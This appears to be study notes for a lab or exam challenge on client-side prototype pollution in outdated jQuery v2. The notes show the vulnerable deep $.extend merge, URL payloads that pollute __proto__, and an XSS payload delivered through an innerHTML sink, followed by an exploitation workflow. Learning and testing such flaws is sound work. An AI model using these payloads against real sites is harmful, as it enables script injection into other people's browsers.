# Client-Side Prototype Pollution Challenge (Detailed Summary)

> [!summary]  
> Detailed guide for identifying and exploiting client-side prototype pollution vulnerabilities using outdated jQuery (v2.x).

---

## Application Overview and Reconnaissance

- Application uses outdated **jQuery v2**, making it vulnerable to prototype pollution.
    
- Local storage persists user settings.
    
- Settings toggles available through UI.
    

> [!tip]  
> Inspect JavaScript code via browser Dev Tools (`F12` → `Sources` → `index.html`).

**Important Code Observations:**

- `$.extend(true, ...)` used for merging objects.
    
- User-controlled input retrieved from URL parameter (`?settings=`).
    

---

## Critical Vulnerability Explanation

Vulnerable merging code:

```javascript
const userSettings = JSON.parse(params.settings);
const updatedPreferences = $.extend(true, currentPreferences, userSettings);
```

- `$.extend(true, ...)` performs deep merges, vulnerable in jQuery < 3.4.0.
    
- JSON-parsed URL parameter provides attacker-controlled input.
    

> [!important]  
> Deep merges (`$.extend(true, ...)`) with unsanitized user input are classic prototype pollution vectors.

---

## Testing Input Flow

### Step 1: Confirm JSON Input Handling

Test invalid JSON:

```plaintext
?settings=test
```

- Expect JSON parsing error.
    

Test valid JSON:

```plaintext
?settings={"test":true}
```

- Should successfully load settings.
    
- Use breakpoints in `getQueryParams`, `applyUserSettingsFromUrl`, and `extend()` to track code execution.
    

### Step 2: Verify Prototype Pollution

Inject pollution payload:

```plaintext
?settings={"__proto__":{"polluted":true}}
```

Verify pollution in console:

```javascript
console.log({}.polluted); // should output true
```

> [!important]  
> Confirm prototype pollution via the JavaScript console (`{}` should reflect polluted properties).

---

## Exploiting the Vulnerability (XSS)

Potential XSS sink identified:

```javascript
const message = userPrefs.message || 'Settings updated';
document.getElementById('status').innerHTML = message;
```

Inject malicious payload via polluted prototype:

```plaintext
?settings={"__proto__":{"message":"<img src=x onerror=prompt(1)>"}}
```

- Message property inherited from polluted prototype.
    
- Payload triggers stored XSS through unsanitized `innerHTML`.
    

> [!danger]  
> This is a critical sink for DOM-based XSS using polluted prototype properties.

---

## Exploitation Workflow Summary

1. Identify vulnerable merging function (`$.extend(true, ...)` with jQuery v2.x).
    
2. Inject JSON payload via URL parameter (`?settings=`).
    
3. Use `__proto__` to pollute global JavaScript object prototypes.
    
4. Find a sink (`innerHTML`) where polluted property is unsafely rendered.
    
5. Trigger stored XSS via polluted property injection.
    

---

## Key Exam Takeaways

> [!success]  
> Essential points for your open-book exam:

- Pay attention to `$.extend(true, ...)` usage in legacy jQuery versions.
    
- Validate prototype pollution via JavaScript console:
    
    ```javascript
    console.log({});
    ```
    
- Test input handling thoroughly, especially URL query parameters.
    
- Exploit DOM sinks (`innerHTML`) for XSS leveraging polluted properties.
    
- Clear local storage if test interference occurs.